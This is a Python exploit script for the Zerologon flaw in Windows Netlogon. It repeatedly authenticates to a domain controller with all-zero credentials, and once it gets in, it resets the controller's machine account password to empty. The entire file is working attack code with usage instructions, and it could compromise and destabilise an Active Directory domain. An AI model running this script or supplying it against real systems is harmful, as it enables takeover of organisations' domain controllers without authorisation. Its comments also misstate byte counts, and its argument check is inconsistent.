#!/usr/bin/env python3

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto
import hmac, hashlib, struct, sys, socket, time
from binascii import hexlify, unhexlify
from subprocess import check_call

# Give up brute-forcing after this many attempts. If vulnerable, 256 attempts are expected to be neccessary on average.
MAX_ATTEMPTS = 2000 # False negative chance: 0.04%


def banner():
  print("""
 _____                   __                         
/ _  / ___ _ __ ___     / /  ___   __ _  ___  _ __  
\// / / _ \ '__/ _ \   / /  / _ \ / _` |/ _ \| '_ \ 
 / //\  __/ | | (_) | / /__| (_) | (_| | (_) | | | |
/____/\___|_|  \___/  \____/\___/ \__, |\___/|_| |_|
                                  |___/             
                Vulnerability Discovered by Tom Tervoort
                              Exploit by Ronnie Bartwitz
  """)
  
def fail(msg):
  print(msg, file=sys.stderr)
  print('This might have been caused by invalid arguments or network issues.', file=sys.stderr)
  sys.exit(2)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # Creates bind to the DC over RPC.
  binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
  rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
  # Connects to RPC
  rpc_con.connect()
  # Creates bind to RPC
  rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

  # Use an all-zero challenge and credential.
  plaintext = b'\x00' * 8 # 16 Bytes, or two hextets of Zero
  ciphertext = b'\x00' * 8 # 16 Bytes, or two hextets of Zero

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
  flags = 0x212fffff

  # Sends Server Challenge Request
  nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
  try:
    #Attempts to Authenticate to the target Domain Controller and actually exploit Zero Logon
    server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,target_computer + '\x00', ciphertext, flags)
    #If login is successful, begin the attempt to change the password
    #For more info see: https://github.com/SecureAuthCorp/impacket/blob/master/impacket/dcerpc/v5/nrpc.py
    newPassRequest = nrpc.NetrServerPasswordSet2()
    newPassRequest['PrimaryName'] = dc_handle + '\x00'
    newPassRequest['AccountName'] = target_computer + '$\x00'
    newPassRequest['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel
    auth = nrpc.NETLOGON_AUTHENTICATOR()
    auth['Credential'] = b'\x00' * 8
    auth['Timestamp'] = 0
    newPassRequest['Authenticator'] = auth
    newPassRequest['ComputerName'] = target_computer + '\x00'
    newPassRequest['ClearNewPassword'] = b'\x00' * 516
    #Triggers password reset
    rpc_con.request(newPassRequest)
    return rpc_con


  except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
    if ex.get_error_code() == 0xc0000022:
      return None
    else:
      fail(f'Unexpected error code from DC: {ex.get_error_code()}.')
  except BaseException as ex:
    fail(f'Unexpected error: {ex}.')


def perform_attack(dc_handle, dc_ip, target_computer):
  # Keep authenticating until succesfull. Expected average number of attempts needed: 256.
  print('Performing authentication attempts...')
  rpc_con = None
  for attempt in range(0, MAX_ATTEMPTS):  
    rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)

    if rpc_con == None:
      print('Failure to Autheticate at attempt number: ' + str(attempt) + '\r', end='', flush=True)
    else:
      break

  if rpc_con:
    print('\nZero Logon successfully exploited, changing password.')

  else:
    print('\nAttack failed. Target is probably patched.')
    sys.exit(1)


if __name__ == '__main__':
  if not (3 <= len(sys.argv) <= 4):
    print('Usage: zerologon-exploit.py <dc-name> <dc-ip>\n')
    print('Updates the machine account password of the domain controller.')
    print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')
    sys.exit(1)
  else:
    banner()
    [_, dc_name, dc_ip] = sys.argv
    dc_name = dc_name.rstrip('$')
    perform_attack('\\\\' + dc_name, dc_ip, dc_name)
